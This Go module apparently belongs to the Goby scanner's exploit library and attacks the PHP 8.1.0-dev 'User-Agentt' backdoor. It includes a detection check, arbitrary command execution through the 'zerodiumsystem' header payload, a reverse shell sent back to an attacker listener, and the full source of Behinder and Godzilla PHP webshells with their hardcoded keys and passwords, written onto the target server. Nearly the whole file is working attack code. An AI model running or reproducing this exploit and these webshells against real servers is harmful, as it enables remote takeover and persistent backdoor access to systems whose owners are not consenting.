package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "PHP User-Agentt remote code execution vulnerability",
    "Description": "<p>PHP is a popular server-side scripting language primarily used for developing dynamic websites and web applications.</p><p>PHP has a backdoor vulnerability in version 8.1.0-dev, which allows attackers to execute arbitrary code by sending a User Agent header, gain server privileges, and then control the entire web server.</p>",
    "Product": "php",
    "Homepage": "https://www.php.net/",
    "DisclosureDate": "2023-09-12",
    "PostTime": "2023-09-12",
    "Author": "fmbd",
    "FofaQuery": "header=\"PHP/8.1.0-dev\" || banner=\"PHP/8.1.0-dev\"",
    "GobyQuery": "header=\"PHP/8.1.0-dev\" || banner=\"PHP/8.1.0-dev\"",
    "Level": "3",
    "Impact": "<p>PHP has a backdoor vulnerability in version 8.1.0-dev, which allows attackers to execute arbitrary code by sending a User Agent header, gain server privileges, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.php.net/downloads\">https://www.php.net/downloads</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "lxmk123.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php var_dump(11*33); ?>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "PHP User-Agentt 远程代码执行漏洞",
            "Product": "php",
            "Description": "<p>PHP 是一种流行的服务器端脚本语言，主要用于开发动态网站和 Web 应用程序。</p><p>PHP 在 8.1.0-dev 版本中存在后门漏洞，攻击者可以通过发送 User-Agentt 头来执行任意代码，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.php.net/downloads\" target=\"_blank\">https://www.php.net/downloads</a></p>",
            "Impact": "<p>PHP 在 8.1.0-dev 版本中存在后门漏洞，攻击者可以通过发送User-Agentt头来执行任意代码，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "PHP User-Agentt remote code execution vulnerability",
            "Product": "php",
            "Description": "<p>PHP is a popular server-side scripting language primarily used for developing dynamic websites and web applications.</p><p>PHP has a backdoor vulnerability in version 8.1.0-dev, which allows attackers to execute arbitrary code by sending a User Agent header, gain server privileges, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.php.net/downloads\" target=\"_blank\">https://www.php.net/downloads</a></p>",
            "Impact": "<p>PHP has a backdoor vulnerability in version 8.1.0-dev, which allows attackers to execute arbitrary code by sending a User Agent header, gain server privileges, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`
	sendPayloadDJWQPIOEUT := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/")
		getRequestConfig.Header.Store("User-Agentt", payload)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)

	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadDJWQPIOEUT(hostInfo, "zerodiumvar_dump(655*1343);")
			return resp != nil && strings.Contains(resp.Utf8Html, "879665")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				resp, err := sendPayloadDJWQPIOEUT(expResult.HostInfo, fmt.Sprintf(`zerodiumsystem("%s");`, strings.ReplaceAll(cmd, `"`, `\"`)))
				if err == nil && resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
				return expResult
			} else if attackType == "reverse" {
				reverse := stepLogs.Params["reverse"].(string)
				waitSessionCh := make(chan string)
				//rp就是拿到的监听端口
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					if reverse == "windows" {
						cmd = godclient.ReverseTCPByPowershell(rp)
					}
					sendPayloadDJWQPIOEUT(expResult.HostInfo, fmt.Sprintf(`zerodiumsystem("%s");`, cmd))
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 20):
					}
				}
				return expResult
			} else if attackType == "webshell" {
				webshell := stepLogs.Params["webshell"].(string)
				var content, tool, password string
				filename := goutils.RandomHexString(5) + ".php"
				if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "custom" {
					content = goutils.B2S(stepLogs.Params["content"])
					filename = goutils.B2S(stepLogs.Params["filename"])
				}
				resp, err := sendPayloadDJWQPIOEUT(expResult.HostInfo, fmt.Sprintf(`zerodiumfile_put_contents('%s','%s');`, filename, strings.ReplaceAll(content, "'", "\\'")))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				checkRequestConfig := httpclient.NewGetRequestConfig(`/` + filename)
				checkRequestConfig.VerifyTls = false
				checkRequestConfig.FollowRedirect = false
				resp, err = httpclient.DoHttpRequest(expResult.HostInfo, checkRequestConfig)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if resp.StatusCode != 200 && resp.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				expResult.Success = true
				if webshell != "custom" {
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					expResult.Output += "Password: " + password + "\n"
					expResult.Output += "WebShell tool: " + tool + "\n"
				}
				expResult.Output += "Webshell type: php"
			}
			return expResult
		},
	))
}
